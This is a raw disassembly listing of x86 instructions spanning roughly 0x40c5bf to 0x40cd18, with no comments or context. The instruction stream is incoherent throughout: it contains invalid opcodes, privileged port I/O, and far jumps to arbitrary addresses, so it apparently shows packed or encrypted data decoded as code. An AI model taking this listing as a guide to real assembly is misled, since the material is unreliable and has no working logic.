  40c5bf:	cmp    DWORD PTR [ebx+0x8],ebp
  40c5c2:	outs   dx,BYTE PTR ds:[esi]
  40c5c3:	je     0x40c551
  40c5c5:	push   esp
  40c5c6:	add    cl,dl
  40c5c8:	and    al,0xb
  40c5ca:	imul   DWORD PTR [ecx+esi*1+0x6d]
  40c5ce:	push   es
  40c5cf:	lea    ecx,[ebx]
  40c5d1:	adc    dl,cl
  40c5d3:	paddq  mm2,mm5
  40c5d6:	sbb    esp,edx
  40c5d8:	jns    0x40c5d8
  40c5da:	call   0x27a7:0x185b62bc
  40c5e1:	xchg   ebp,eax
  40c5e2:	outs   dx,BYTE PTR ds:[esi]
  40c5e3:	xor    dh,cl
  40c5e5:	xchg   esp,eax
  40c5e6:	outs   dx,BYTE PTR ds:[esi]
  40c5e7:	mov    ds:0x6618edcf,eax
  40c5ec:	les    ebx,FWORD PTR [edx+0x46]
  40c5ef:	pushf  
  40c5f0:	and    dl,BYTE PTR [ebp+0x4]
  40c5f3:	repz daa 
  40c5f5:	push   cs
  40c5f6:	out    0x10,eax
  40c5f8:	nop
  40c5f9:	mov    bl,BYTE PTR [edi+0x70]
  40c5fc:	jnp    0x40c621
  40c5fe:	inc    edi
  40c5ff:	ret    0xcbb5
  40c602:	int    0xa
  40c604:	sbb    DWORD PTR [esi],0x46
  40c607:	je     0x40c657
  40c609:	aam    0x57
  40c60b:	cmp    BYTE PTR [eax+0x39],ah
  40c60e:	mov    ch,cl
  40c610:	add    BYTE PTR [ecx-0x36],ah
  40c613:	test   DWORD PTR [esi+esi*4],0x73fc0f8
  40c61a:	xor    al,0xb2
  40c61c:	cmc    
  40c61d:	jle    0x40c5ec
  40c61f:	sub    eax,0x45da05bc
  40c624:	les    ebx,FWORD PTR [eax]
  40c626:	fs jg  0x40c61e
  40c629:	mov    esp,0x8af28e00
  40c62e:	pop    ecx
  40c62f:	(bad)  
  40c630:	mov    ebx,0x320b0aef
  40c635:	add    esi,DWORD PTR [esi-0x64]
  40c638:	add    eax,0x4b06ac8a
  40c63d:	xor    DWORD PTR [eax],eax
  40c63f:	jge    0x40c61a
  40c641:	rcl    DWORD PTR [ebx],0xcb
  40c644:	mov    ebx,0x5356409d
  40c649:	gs hlt 
  40c64b:	gs in  al,0xc6
  40c64e:	leave  
  40c64f:	rcr    BYTE PTR [edx],0x77
  40c652:	adc    eax,0x6adadd5d
  40c657:	ror    bh,cl
  40c659:	xor    cl,BYTE PTR ds:0x87f98808
  40c65f:	nop
  40c660:	cmp    esp,DWORD PTR [edi+edi*2-0x5e]
  40c664:	cmp    BYTE PTR [edx],ch
  40c666:	and    esp,esp
  40c668:	lods   eax,DWORD PTR ds:[esi]
  40c669:	callw  0x8636
  40c66d:	dec    esp
  40c66e:	stc    
  40c66f:	cwde   
  40c670:	pop    es
  40c671:	xor    ch,BYTE PTR [ebp+0x2b]
  40c674:	mov    ds:0x6c16f572,eax
  40c679:	jge    0x40c6b9
  40c67b:	ins    BYTE PTR es:[edi],dx
  40c67c:	cmp    al,bl
  40c67e:	retf   
  40c67f:	in     eax,dx
  40c680:	sub    BYTE PTR [edi+0x2e],ch
  40c683:	aaa    
  40c684:	scas   al,BYTE PTR es:[edi]
  40c685:	dec    esi
  40c686:	inc    ebx
  40c687:	push   esi
  40c688:	xor    eax,0x5392362f
  40c68d:	jo     0x40c6d2
  40c68f:	or     DWORD PTR [ecx-0x6887241b],esp
  40c695:	imul   eax,DWORD PTR [eax],0xca00ee88
  40c69b:	ds sub eax,0xc3725ea1
  40c6a1:	vpsubsw ymm3,ymm3,YMMWORD PTR [edx+ecx*1]
  40c6a6:	cwde   
  40c6a7:	adc    BYTE PTR [ebp+0x5d],0xb
  40c6ab:	mov    dh,0xa6
  40c6ad:	pop    ds
  40c6ae:	test   BYTE PTR [eax-0x23],cl
  40c6b1:	push   ds
  40c6b2:	mov    ?,WORD PTR [esp+eax*4+0x2379e449]
  40c6b9:	cmp    eax,0x8bdcada5
  40c6be:	ins    DWORD PTR es:[edi],dx
  40c6bf:	into   
  40c6c0:	icebp  
  40c6c1:	(bad)  
  40c6c2:	loop   0x40c6e7
  40c6c4:	cmp    al,0x69
  40c6c6:	scas   eax,DWORD PTR es:[edi]
  40c6c7:	mov    dl,0xde
  40c6c9:	xor    ebx,DWORD PTR [edx+0x64]
  40c6cc:	pop    ecx
  40c6cd:	cmp    eax,0xdb5f9429
  40c6d2:	stc    
  40c6d3:	(bad)  
  40c6d4:	mov    ch,0x8a
  40c6d6:	xor    ecx,esi
  40c6d8:	in     eax,0x45
  40c6da:	xchg   ebx,eax
  40c6db:	push   ds
  40c6dc:	sar    edi,1
  40c6de:	call   0x4b05ec1f
  40c6e3:	push   ds
  40c6e4:	test   eax,0x433043d7
  40c6e9:	jp     0x40c66d
  40c6eb:	ss mov edx,0x373e3d03
  40c6f1:	and    dl,BYTE PTR [ebx+eax*8-0xc]
  40c6f5:	sar    ch,0xb8
  40c6f8:	pop    ecx
  40c6f9:	scas   eax,DWORD PTR es:[edi]
  40c6fa:	call   0x1239:0x7f9b2723
  40c701:	and    ah,bh
  40c703:	jmp    0x66ddb016
  40c708:	add    dh,ah
  40c70a:	or     eax,DWORD PTR [ebx-0x54d8d38e]
  40c710:	add    al,dl
  40c712:	dec    ecx
  40c713:	sti    
  40c714:	mov    BYTE PTR [edi+0x4],dh
  40c717:	lea    esp,[eax-0x5144fbe1]
  40c71d:	push   ebx
  40c71e:	push   edx
  40c71f:	shl    BYTE PTR [edi-0x4fa0ede1],cl
  40c725:	and    dh,BYTE PTR [ecx+0x1f474304]
  40c72b:	sbb    edx,DWORD PTR ds:0x66a1544b
  40c731:	and    dl,BYTE PTR [ebp+0x64]
  40c734:	push   es
  40c735:	pop    ds
  40c736:	adc    DWORD PTR [edx-0x3bd7d30a],esi
  40c73c:	popa   
  40c73d:	dec    edi
  40c73e:	dec    edx
  40c73f:	adc    al,0xdd
  40c741:	and    BYTE PTR ds:0xb4fbb744,ah
  40c747:	inc    ebx
  40c748:	leave  
  40c749:	dec    ebp
  40c74a:	popf   
  40c74b:	sbb    al,0x10
  40c74d:	xchg   edi,eax
  40c74e:	in     eax,dx
  40c74f:	rol    BYTE PTR [edi],0xff
  40c752:	jnp    0x40c77e
  40c754:	jnp    0x40c74f
  40c756:	jbe    0x40c7a3
  40c758:	icebp  
  40c759:	add    al,dh
  40c75b:	push   0xe5fc7d80
  40c760:	push   0x17
  40c762:	test   al,0x37
  40c764:	and    eax,0xc963ba53
  40c769:	and    bh,0x68
  40c76c:	dec    ebp
  40c76d:	call   0xfe39bd97
  40c772:	fldcw  WORD PTR [esi]
  40c774:	adc    esi,DWORD PTR [esi]
  40c776:	xor    al,0x3d
  40c778:	in     al,dx
  40c779:	jg     0x40c77e
  40c77b:	mov    ebx,0xad04ed1
  40c780:	add    eax,0xa852df82
  40c785:	ins    BYTE PTR es:[edi],dx
  40c786:	imul   al
  40c788:	adc    eax,0x1ba9aff
  40c78d:	mov    WORD PTR [esi],ss
  40c78f:	mov    ecx,?
  40c791:	or     DWORD PTR [esi+eiz*1+0x14],0xffffffca
  40c796:	inc    ebp
  40c797:	mov    edx,0x4bfbc3bd
  40c79c:	pop    ss
  40c79d:	rcr    BYTE PTR [edx],0x6e
  40c7a0:	mov    ebx,0x7f7832a2
  40c7a5:	xchg   esi,eax
  40c7a6:	aas    
  40c7a7:	add    BYTE PTR [edx+0x1f],dl
  40c7aa:	setge  BYTE PTR [edi-0xe969398]
  40c7b1:	xchg   esp,eax
  40c7b3:	sub    DWORD PTR [esi],esi
  40c7b5:	test   al,0x36
  40c7b7:	add    eax,DWORD PTR [eax-0x14]
  40c7ba:	xchg   edx,eax
  40c7bb:	push   cs
  40c7bc:	int3   
  40c7bd:	and    DWORD PTR [eax*4+0x2bec760b],esi
  40c7c4:	mov    bh,cl
  40c7c6:	(bad)  
  40c7c7:	out    dx,eax
  40c7c8:	inc    esi
  40c7c9:	jg     0x40c757
  40c7cb:	sub    eax,0xd8801891
  40c7d0:	retf   
  40c7d1:	js     0x40c7c1
  40c7d3:	rol    ecx,0x6b
  40c7d6:	add    ecx,ebx
  40c7d8:	or     BYTE PTR [edx+0x79],0xbd
  40c7dc:	rcr    DWORD PTR [edi-0x61],cl
  40c7df:	shr    cl,1
  40c7e1:	pop    edi
  40c7e2:	jae    0x40c7da
  40c7e4:	push   es
  40c7e5:	int    0xf3
  40c7e7:	mov    bl,0xdb
  40c7e9:	(bad)
  40c7ec:	cmp    al,BYTE PTR [esi-0x35]
  40c7ef:	pop    edx
  40c7f0:	ins    BYTE PTR es:[edi],dx
  40c7f1:	lock clc 
  40c7f3:	mov    dh,0x2a
  40c7f5:	scas   eax,DWORD PTR es:[edi]
  40c7f6:	push   esp
  40c7f7:	loopne 0x40c816
  40c7f9:	xchg   esp,eax
  40c7fa:	xchg   BYTE PTR ds:0xb13ba5e4,ch
  40c800:	rol    BYTE PTR [ebx+esi*1+0x1f],0x29
  40c805:	lock pusha 
  40c807:	cmc    
  40c808:	sbb    eax,0xce47ad2
  40c80d:	daa    
  40c80e:	into   
  40c80f:	ficomp WORD PTR [edx+0x52]
  40c812:	ins    DWORD PTR es:[edi],dx
  40c813:	add    al,0xce
  40c815:	rcr    DWORD PTR ss:[ebp-0x5f],cl
  40c819:	test   BYTE PTR [ecx+0x2e],ch
  40c81c:	push   ebx
  40c81d:	mov    BYTE PTR [edx+0xe],ch
  40c820:	inc    DWORD PTR [edx-0x109e20f0]
  40c826:	clc    
  40c827:	sti    
  40c828:	or     DWORD PTR [eax],edi
  40c82a:	jg     0x40c862
  40c82c:	rcr    DWORD PTR ds:0x995d228a,1
  40c832:	cli    
  40c833:	sub    esi,DWORD PTR [edx+edi*1-0x4a]
  40c837:	pop    edi
  40c838:	leave  
  40c839:	mov    WORD PTR [ecx+0x76],cs
  40c83c:	push   esp
  40c83d:	leave  
  40c83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c83f:	jge    0x40c875
  40c841:	dec    esp
  40c842:	cs mov ecx,0x73bc77e1
  40c848:	fwait
  40c849:	cli    
  40c84a:	xor    eax,0x31250248
  40c84f:	xchg   esp,eax
  40c850:	div    BYTE PTR ds:0xb12ffbd
  40c856:	adc    al,0xcd
  40c858:	sbb    eax,0x96f7cb8a
  40c85d:	xlat   BYTE PTR ds:[ebx]
  40c85e:	(bad)  
  40c85f:	and    DWORD PTR [eax-0x49770811],esp
  40c865:	xor    dh,dl
  40c867:	lds    ebx,FWORD PTR [edx+0x7f6fb27e]
  40c86d:	dec    eax
  40c86e:	cmp    ebp,DWORD PTR [edi]
  40c870:	dec    eax
  40c871:	adc    BYTE PTR [esi+0x47],0x0
  40c875:	std    
  40c876:	sbb    al,0x1d
  40c878:	dec    esp
  40c879:	adc    al,ch
  40c87b:	pop    edx
  40c87c:	imul   sp,WORD PTR [esi+esi*4-0x8],0xd3fb
  40c883:	(bad)  
  40c885:	xor    esi,DWORD PTR [eax+eiz*1]
  40c888:	lods   eax,DWORD PTR ds:[esi]
  40c889:	ins    BYTE PTR es:[edi],dx
  40c88a:	pop    esp
  40c88b:	push   0xd363d5e9
  40c890:	jmp    0x40c8ac
  40c892:	dec    edx
  40c893:	dec    BYTE PTR [eax]
  40c895:	xlat   BYTE PTR ds:[ebx]
  40c896:	rcl    edx,1
  40c898:	xchg   ebp,eax
  40c899:	cmp    ah,BYTE PTR [ecx+ebx*1+0x5f4c4b84]
  40c8a0:	jb     0x40c842
  40c8a2:	jecxz  0x40c89e
  40c8a4:	jae    0x40c905
  40c8a6:	cmp    BYTE PTR [esi+0x11],cl
  40c8a9:	pop    esi
  40c8aa:	shr    DWORD PTR [ebx],1
  40c8ac:	xchg   esp,eax
  40c8ad:	fsubr  QWORD PTR [ebx]
  40c8af:	and    bh,BYTE PTR [eax]
  40c8b1:	imul   ebx,ecx,0xffffffa9
  40c8b4:	and    esp,DWORD PTR [edx-0x49af37c5]
  40c8ba:	cdq    
  40c8bb:	or     BYTE PTR [edi-0x52],ch
  40c8be:	icebp  
  40c8bf:	sub    al,0x82
  40c8c1:	push   edx
  40c8c2:	imul   eax,DWORD PTR [ecx+0x60],0xffffffa6
  40c8c6:	dec    ebp
  40c8c7:	mov    ecx,ebp
  40c8c9:	popf   
  40c8ca:	or     ah,BYTE PTR [edx*2-0x7852ae5c]
  40c8d1:	add    dh,BYTE PTR [esi-0x7676b6e]
  40c8d7:	lds    eax,FWORD PTR [edx+0x6136e3f0]
  40c8dd:	stos   DWORD PTR es:[edi],eax
  40c8de:	ins    BYTE PTR es:[edi],dx
  40c8df:	enter  0x5826,0xb9
  40c8e3:	xor    dh,BYTE PTR [ecx-0x50]
  40c8e6:	mov    bh,0x46
  40c8e8:	sub    BYTE PTR [esi+0x595bcfdf],0x9f
  40c8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8f0:	and    cl,bl
  40c8f2:	mov    esi,0x68dcefb2
  40c8f7:	cmc    
  40c8f8:	adc    esi,esp
  40c8fa:	gs es sub al,0x36
  40c8fe:	sub    DWORD PTR [ecx],esi
  40c900:	pop    esi
  40c901:	xchg   esi,eax
  40c902:	cmp    al,0xf1
  40c904:	(bad)  
  40c905:	push   esp
  40c906:	add    esp,edx
  40c908:	push   0xdc1ac07a
  40c90d:	call   0x1a971512
  40c912:	dec    ebx
  40c913:	mov    ch,0x9e
  40c915:	dec    eax
  40c916:	jo     0x40c939
  40c918:	push   ds
  40c919:	repz inc esi
  40c91b:	out    0x21,al
  40c91d:	(bad)  
  40c91e:	pop    esi
  40c91f:	dec    eax
  40c920:	and    al,0x85
  40c922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c923:	lods   al,BYTE PTR ds:[esi]
  40c924:	aam    0xd
  40c926:	adc    BYTE PTR [edi-0x21afcaee],dh
  40c92c:	cmp    BYTE PTR [edi-0x73f9d2f2],bh
  40c932:	je     0x40c916
  40c934:	ins    BYTE PTR es:[edi],dx
  40c935:	push   eax
  40c936:	push   0x2d333346
  40c93b:	dec    esp
  40c93c:	inc    edx
  40c93d:	pusha  
  40c93e:	pop    es
  40c93f:	(bad)  
  40c940:	dec    esi
  40c941:	mov    esp,gs
  40c943:	xor    dl,BYTE PTR [ebx+0x1506334a]
  40c949:	retf   0x9a87
  40c94c:	aas    
  40c94d:	mov    ds:0xc9d8ebc6,al
  40c952:	popf   
  40c953:	rcl    DWORD PTR [esi+0x99eb63f],0x3f
  40c95a:	fwait
  40c95b:	mov    dl,0xdb
  40c95d:	sub    eax,0xb4a437de
  40c962:	xacquire xchg BYTE PTR ds:0x516fcb36,bh
  40c969:	push   ss
  40c96a:	push   edx
  40c96b:	inc    ebx
  40c96c:	loopne 0x40c94c
  40c96e:	loop   0x40c906
  40c970:	pop    ss
  40c971:	sbb    ebp,edx
  40c973:	cmp    BYTE PTR [edx],al
  40c975:	(bad)  
  40c976:	scas   al,BYTE PTR es:[edi]
  40c977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c978:	(bad)  
  40c97a:	bound  esi,QWORD PTR [esi+0x210e45e1]
  40c980:	jae    0x40c96f
  40c982:	mov    al,ds:0x1c6b04a8
  40c987:	or     DWORD PTR [ecx],ecx
  40c989:	smsw   ebp
  40c98c:	mov    BYTE PTR [esi+0x57],al
  40c98f:	js     0x40c958
  40c991:	fsub   st(3),st
  40c993:	dec    ebx
  40c994:	leave  
  40c995:	lods   al,BYTE PTR ds:[esi]
  40c996:	test   eax,0x9a4acdd6
  40c99b:	push   ebx
  40c99c:	stc    
  40c99d:	rol    BYTE PTR [edi-0x8],1
  40c9a0:	retf   
  40c9a1:	mov    edi,0xd2a6a731
  40c9a6:	mov    ah,0x78
  40c9a8:	je     0x40c96a
  40c9aa:	sub    edx,esi
  40c9ac:	cmp    BYTE PTR [ecx],ch
  40c9ae:	or     cl,BYTE PTR [esi+0x36]
  40c9b1:	sbb    edx,DWORD PTR [ecx-0x2bc1f357]
  40c9b7:	inc    esp
  40c9b8:	add    DWORD PTR [edi-0xaa4ef65],ecx
  40c9be:	fneni(8087 only) 
  40c9c0:	rol    ebx,cl
  40c9c2:	pushf  
  40c9c3:	dec    ebx
  40c9c4:	mov    esi,0x81443327
  40c9c9:	xchg   edi,eax
  40c9ca:	scas   al,BYTE PTR es:[edi]
  40c9cb:	mov    eax,ds:0x1392ae58
  40c9d0:	sub    eax,0x3fe45176
  40c9d5:	(bad)  
  40c9d6:	pusha  
  40c9d7:	xor    eax,0x2d566a2d
  40c9dc:	cmp    al,0x4c
  40c9de:	pop    edi
  40c9df:	jae    0x40ca26
  40c9e1:	jnp    0x40c9e5
  40c9e3:	pop    edx
  40c9e4:	rol    BYTE PTR [edx-0x3d],cl
  40c9e7:	test   al,0x8b
  40c9e9:	imul   edi,DWORD PTR [eax+edx*1],0x3a91880c
  40c9f0:	fnstsw WORD PTR [eax-0x39ba7ae]
  40c9f6:	cmp    al,dl
  40c9f8:	ss push eax
  40c9fa:	add    DWORD PTR [esp+edi*4],eax
  40c9fd:	ficom  DWORD PTR [ebp+0x24005b8b]
  40ca03:	loope  0x40ca4e
  40ca05:	cs sub eax,0x15401f6d
  40ca0b:	cmp    ebx,esi
  40ca0d:	ror    BYTE PTR [eax+ebx*1+0x49],0xf1
  40ca12:	xchg   esp,eax
  40ca13:	mov    edi,0x61cd1f8e
  40ca18:	arpl   WORD PTR [edx+0x64e618e3],bx
  40ca1e:	jns    0x40ca9e
  40ca20:	nop
  40ca21:	call   0x2485:0x2c81b795
  40ca28:	push   0x9908edf3
  40ca2d:	scas   al,BYTE PTR es:[edi]
  40ca2e:	sub    edi,DWORD PTR [edx+0x31a42edb]
  40ca34:	repnz mov ds:0xb6e1463b,al
  40ca3a:	int    0x29
  40ca3c:	inc    edi
  40ca3d:	mov    esi,DWORD PTR [ecx+eiz*1+0x76]
  40ca41:	arpl   WORD PTR [edx+0x58],cx
  40ca44:	(bad)
  40ca49:	xchg   ebp,eax
  40ca4a:	push   ebp
  40ca4b:	jns    0x40ca7a
  40ca4d:	jl     0x40ca21
  40ca4f:	push   ss
  40ca50:	mov    ebx,0x5ee6da41
  40ca55:	or     BYTE PTR [ecx],ah
  40ca57:	xlat   BYTE PTR ds:[ebx]
  40ca58:	test   DWORD PTR [esi-0x6e],eax
  40ca5b:	jne    0x40ca2b
  40ca5d:	call   0xd694:0x33a3fdce
  40ca64:	ret    
  40ca65:	pop    eax
  40ca66:	enter  0xe98,0x1e
  40ca6a:	jmp    0x17fa:0x8dd28ce5
  40ca71:	dec    ecx
  40ca72:	(bad)  
  40ca73:	sub    eax,0xd8d2df3
  40ca78:	xchg   ecx,eax
  40ca79:	stos   DWORD PTR es:[edi],eax
  40ca7a:	hlt    
  40ca7b:	mov    bh,0x5b
  40ca7d:	fcom   DWORD PTR ds:0x38f57e5c
  40ca83:	pop    esp
  40ca84:	and    esp,edi
  40ca86:	add    al,0x1f
  40ca88:	cmp    ecx,DWORD PTR [esi]
  40ca8a:	adc    ah,al
  40ca8c:	sbb    eax,DWORD PTR [edi+0x64]
  40ca8f:	xor    DWORD PTR [edi],edx
  40ca91:	pushf  
  40ca92:	cwde   
  40ca93:	or     BYTE PTR [ecx-0x247be259],dl
  40ca99:	lods   al,BYTE PTR ds:[esi]
  40ca9a:	arpl   WORD PTR [edi-0x60],dx
  40ca9d:	dec    esp
  40ca9e:	mov    eax,0x3b19e657
  40caa3:	loop   0x40ca2a
  40caa5:	retf   
  40caa6:	outs   dx,DWORD PTR ds:[esi]
  40caa7:	inc    ecx
  40caa8:	dec    ecx
  40caa9:	dec    esp
  40caaa:	mov    al,0x18
  40caac:	(bad)  ds:0x273d1101
  40cab2:	pop    edi
  40cab3:	popf   
  40cab4:	rol    DWORD PTR [edx+0x46],1
  40cab7:	sbb    esp,DWORD PTR [ecx-0x1e]
  40caba:	fsubr  QWORD PTR [esi]
  40cabc:	not    DWORD PTR [ecx-0x37]
  40cabf:	lahf   
  40cac0:	or     eax,0x17046221
  40cac5:	rcr    DWORD PTR [ebp+0x5fcb8515],cl
  40cacb:	push   ebp
  40cacc:	push   ebx
  40cacd:	stos   DWORD PTR es:[edi],eax
  40cace:	data16 jl 0x40ca78
  40cad1:	into   
  40cad2:	or     bh,BYTE PTR [esi-0x50801911]
  40cad8:	imul   ecx,DWORD PTR [ebx+0x51],0xffffffb8
  40cadc:	or     al,0x0
  40cade:	adc    al,0x7e
  40cae0:	and    DWORD PTR [ecx-0x1aced4c4],ebp
  40cae6:	inc    esi
  40cae7:	push   esi
  40cae8:	dec    ebx
  40cae9:	inc    bx
  40caeb:	xchg   edx,eax
  40caec:	dec    esp
  40caed:	pop    eax
  40caee:	sbb    bh,ah
  40caf0:	sub    eax,ebp
  40caf2:	mov    al,0xfd
  40caf4:	bound  ebp,QWORD PTR [esi-0x50761596]
  40cafa:	les    edi,FWORD PTR [ebp+0x3b]
  40cafd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cafe:	(bad)  [esi+0x12]
  40cb01:	nop
  40cb02:	sbb    DWORD PTR [edx-0x3020ac46],ebx
  40cb08:	loope  0x40cae2
  40cb0a:	out    0xac,eax
  40cb0c:	fwait
  40cb0d:	dec    edx
  40cb0e:	pop    es
  40cb0f:	icebp  
  40cb10:	pop    ss
  40cb11:	sbb    DWORD PTR [ecx+0xbc72424],0x3508ee0d
  40cb1b:	rol    bh,0xd9
  40cb1e:	mov    ecx,DWORD PTR [ecx-0x4d]
  40cb21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb22:	sbb    ebp,edi
  40cb24:	test   DWORD PTR [ebx+0x31],0xc203d94a
  40cb2b:	pushf  
  40cb2c:	xchg   ecx,eax
  40cb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb2e:	int    0x8a
  40cb30:	sbb    DWORD PTR [edx],edi
  40cb32:	iret   
  40cb33:	data16 mov ah,0x34
  40cb36:	in     eax,0x71
  40cb38:	add    edi,DWORD PTR [ecx]
  40cb3a:	js     0x40cb02
  40cb3c:	jno    0x40cae8
  40cb3e:	rcl    BYTE PTR [esp+edi*2-0xbd47db4],cl
  40cb45:	sahf   
  40cb46:	vcmpsd xmm4,xmm3,QWORD PTR [edx],0x9f
  40cb4b:	ret    0x4e61
  40cb4e:	xor    al,0xbf
  40cb50:	jg     0x40cae0
  40cb52:	into   
  40cb53:	mov    esp,0xc7a7fd
  40cb58:	(bad)  
  40cb59:	daa    
  40cb5a:	dec    eax
  40cb5b:	push   0x2890fd75
  40cb60:	mov    bh,0x50
  40cb62:	push   eax
  40cb63:	loop   0x40cb55
  40cb65:	sbb    al,0xa
  40cb67:	fbstp  TBYTE PTR [eax+0xe]
  40cb6a:	sub    ebp,DWORD PTR [eax]
  40cb6c:	ds loop 0x40cba7
  40cb6f:	adc    cl,bl
  40cb71:	mov    cl,0x4a
  40cb73:	cmp    DWORD PTR [ecx+0x7ee4abee],esi
  40cb79:	inc    esp
  40cb7a:	jp     0x40cb0c
  40cb7c:	ds inc ebx
  40cb7e:	mov    bl,0x0
  40cb80:	xchg   ebx,eax
  40cb81:	lds    esp,FWORD PTR [ecx+0x75041646]
  40cb87:	xchg   ebp,eax
  40cb88:	or     al,0x46
  40cb8a:	sub    ebp,DWORD PTR [esi]
  40cb8c:	and    al,0xc9
  40cb8e:	lods   al,BYTE PTR ds:[esi]
  40cb8f:	lds    ebp,FWORD PTR [ebx]
  40cb91:	inc    eax
  40cb92:	inc    ebx
  40cb93:	mov    DWORD PTR [esi+0x6383cef4],edi
  40cb99:	hlt    
  40cb9a:	out    0x6b,eax
  40cb9c:	and    ebp,eax
  40cb9e:	test   DWORD PTR [edi+0x46d0bd06],esi
  40cba4:	frstor [esi+0x17]
  40cba7:	jno    0x40cb40
  40cba9:	push   ebp
  40cbaa:	mov    eax,0xbe899ed1
  40cbaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbb0:	or     ebp,DWORD PTR [edx+ebx*8-0x5481eef8]
  40cbb7:	sbb    eax,0x1437e05e
  40cbbc:	(bad)  
  40cbbd:	mov    ebp,0xdfd4a0d
  40cbc2:	les    ebp,FWORD PTR [ebx+edi*4+0x70]
  40cbc6:	pop    esi
  40cbc7:	out    0x77,eax
  40cbc9:	rcr    BYTE PTR [esi+0x2e736f6],cl
  40cbcf:	xor    eax,edx
  40cbd1:	inc    esi
  40cbd2:	mov    DWORD PTR [ebx+0x6a],ebx
  40cbd5:	jo     0x40cb8e
  40cbd7:	jg     0x40cbae
  40cbd9:	add    ebx,DWORD PTR [eax+0x1b2e20ad]
  40cbdf:	jg     0x40cc5d
  40cbe1:	mov    DWORD PTR [edi-0x1],ebp
  40cbe4:	rcr    BYTE PTR [ebp-0x4b],1
  40cbe7:	call   0x7b3:0xba246af6
  40cbee:	add    ah,BYTE PTR [esi-0x4f]
  40cbf1:	cwde   
  40cbf2:	pop    edx
  40cbf3:	jp     0x40cc1a
  40cbf5:	das    
  40cbf6:	and    edx,edx
  40cbf8:	push   es
  40cbf9:	sbb    al,0xca
  40cbfb:	jl     0x40cbf6
  40cbfd:	aas    
  40cbfe:	mov    bl,0x80
  40cc00:	dec    ecx
  40cc01:	retf   0x8748
  40cc04:	pop    esp
  40cc05:	shl    ebx,cl
  40cc07:	aam    0xe4
  40cc09:	pop    edi
  40cc0a:	pop    eax
  40cc0b:	sub    ecx,ebp
  40cc0d:	dec    ebp
  40cc0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc0f:	or     BYTE PTR [edi+0x6b396838],ch
  40cc15:	mov    ebx,0x485963a
  40cc1a:	adc    BYTE PTR [ebp-0x7d],ah
  40cc1d:	xor    eax,0x2327ae7b
  40cc22:	and    eax,DWORD PTR fs:[edi-0x71e23968]
  40cc29:	out    0xe0,al
  40cc2b:	mov    cl,0x2
  40cc2d:	sbb    ch,BYTE PTR [ecx]
  40cc2f:	mov    ah,0xf1
  40cc31:	test   al,0xd
  40cc33:	out    dx,al
  40cc34:	fimul  DWORD PTR [ebx+0x2e]
  40cc37:	or     esi,ecx
  40cc39:	xor    eax,0x813c959c
  40cc3e:	mov    esp,0x883687a8
  40cc43:	or     edi,eax
  40cc45:	data16 pushw ss
  40cc48:	jl     0x40cbd7
  40cc4a:	imul   eax,ebp,0x13
  40cc4d:	es clc 
  40cc4f:	mov    bh,0xf3
  40cc51:	mov    esi,DWORD PTR [esi+0x64]
  40cc54:	mov    dh,0x10
  40cc56:	pop    eax
  40cc57:	adc    al,0xd5
  40cc59:	cmc    
  40cc5a:	test   eax,0xf48801ee
  40cc5f:	dec    edx
  40cc60:	hlt    
  40cc61:	mov    edi,0xdcb15213
  40cc66:	or     BYTE PTR [esi-0x31fac506],dh
  40cc6c:	fld    DWORD PTR es:[ebx+0x5338866c]
  40cc73:	xor    ah,dl
  40cc75:	popa   
  40cc76:	leave  
  40cc77:	or     eax,0xd29fcd00
  40cc7c:	outs   dx,BYTE PTR ds:[esi]
  40cc7d:	pop    esp
  40cc7e:	out    0x3c,al
  40cc80:	mov    dh,BYTE PTR [ebp+0x18293055]
  40cc86:	adc    BYTE PTR [edi-0x7c],bh
  40cc89:	and    al,0x7
  40cc8b:	repz clc 
  40cc8d:	xor    bl,bh
  40cc8f:	xor    al,0x71
  40cc91:	pushf  
  40cc92:	shr    dh,cl
  40cc94:	jge    0x40ccd2
  40cc96:	retf   
  40cc97:	dec    eax
  40cc98:	cmp    eax,0x82b80699
  40cc9d:	nop
  40cc9e:	mov    ch,0x91
  40cca0:	adc    DWORD PTR [ecx+0x74],ecx
  40cca3:	and    eax,0x856f1cb9
  40cca8:	xchg   ebx,eax
  40cca9:	aaa    
  40ccaa:	xlat   BYTE PTR ds:[ebx]
  40ccab:	lahf   
  40ccac:	mov    BYTE PTR [ecx],dl
  40ccae:	inc    esp
  40ccaf:	loop   0x40ccb0
  40ccb1:	retfw  
  40ccb3:	add    ebx,esp
  40ccb5:	jge    0x40ccdc
  40ccb7:	mov    ds:0x300ed797,eax
  40ccbc:	cdq    
  40ccbd:	jno    0x40cca0
  40ccbf:	xchg   ecx,eax
  40ccc0:	mov    edx,0xdbd29673
  40ccc5:	clc    
  40ccc6:	adc    al,0xe4
  40ccc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc9:	push   ecx
  40ccca:	jns    0x40cd32
  40cccc:	push   0xffffffca
  40ccce:	int3   
  40cccf:	mov    dl,0xcb
  40ccd1:	fld    QWORD PTR [esi-0x70ade05a]
  40ccd7:	mov    ebp,0x6d8f2e64
  40ccdc:	lods   eax,DWORD PTR ds:[esi]
  40ccdd:	inc    eax
  40ccde:	mov    edi,0x1bff05ed
  40cce3:	pop    edx
  40cce4:	out    0x42,al
  40cce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce7:	or     eax,0x52f8a2c3
  40ccec:	cmp    al,0x8
  40ccee:	stc    
  40ccef:	xchg   ebx,eax
  40ccf0:	xor    ch,dh
  40ccf2:	ror    BYTE PTR [edi],cl
  40ccf4:	pop    es
  40ccf5:	pop    edi
  40ccf6:	and    edx,DWORD PTR [edx+edx*1+0x48a60419]
  40ccfd:	mov    ds:0xe53031d7,al
  40cd02:	aad    0x5e
  40cd04:	jp     0x40cd1c
  40cd06:	xor    al,0x7f
  40cd08:	cmc    
  40cd09:	mov    al,0x64
  40cd0b:	add    bh,ah
  40cd0d:	jne    0x40cd8a
  40cd0f:	sbb    al,0x3d
  40cd11:	outs   dx,DWORD PTR ds:[esi]
  40cd12:	and    ecx,DWORD PTR [ebp-0x5f70fb1f]
  40cd18:	lea    ecx,[edx+0x49]
